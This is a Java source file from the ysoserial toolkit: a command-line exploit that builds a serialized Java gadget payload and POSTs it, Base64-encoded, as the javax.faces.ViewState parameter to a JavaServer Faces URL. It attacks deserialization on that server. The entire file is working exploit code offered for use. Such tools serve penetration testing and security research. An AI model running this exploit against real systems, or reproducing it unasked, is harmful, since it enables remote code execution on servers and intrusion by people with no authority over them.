/**
 * © 2016 AgNO3 Gmbh & Co. KG
 * All right reserved.
 * 
 * Created: 24.01.2016 by mbechler
 */
package ysoserial;


import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

import hudson.remoting.Base64;
import ysoserial.payloads.ObjectPayload;


/**
 * @author mbechler
 *
 */
public class JSF {

    /**
     * @param args
     */
    public static void main ( String[] args ) {

        if ( args.length < 3 ) {
            System.err.println(Jenkins.class.getName() + " <view_url> <payload_type> <payload_arg>");
            System.exit(-1);
        }

        final Class<? extends ObjectPayload> payloadClass = Jenkins.getPayloadClass(args[ 1 ]);
        if ( payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass) ) {
            System.err.println("Invalid payload type '" + args[ 1 ] + "'");
            System.exit(-1);
            return;
        }

        final Object payloadObject;
        try {
            final ObjectPayload payload = payloadClass.newInstance();
            payloadObject = payload.getObject(args[ 2 ]);
        }
        catch ( Exception e ) {
            System.err.println("Failed to construct payload");
            e.printStackTrace(System.err);
            System.exit(-1);
            return;
        }

        try {
            URL u = new URL(args[ 0 ]);

            URLConnection c = u.openConnection();
            if ( ! ( c instanceof HttpURLConnection ) ) {
                throw new Exception("Not a HTTP url"); //$NON-NLS-1$
            }

            HttpURLConnection hc = (HttpURLConnection) c;
            hc.setDoOutput(true);
            hc.setRequestMethod("POST");
            hc.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            OutputStream os = hc.getOutputStream();

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(payloadObject);
            oos.close();
            byte[] data = bos.toByteArray();
            String requestBody = "j_id_7_SUBMIT=1&javax.faces.ViewState=" + URLEncoder.encode(Base64.encode(data), "US-ASCII");
            os.write(requestBody.getBytes("US-ASCII"));
            os.close();

            System.err.println("Have response code " + hc.getResponseCode() + " " + hc.getResponseMessage());
        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }

    }

}
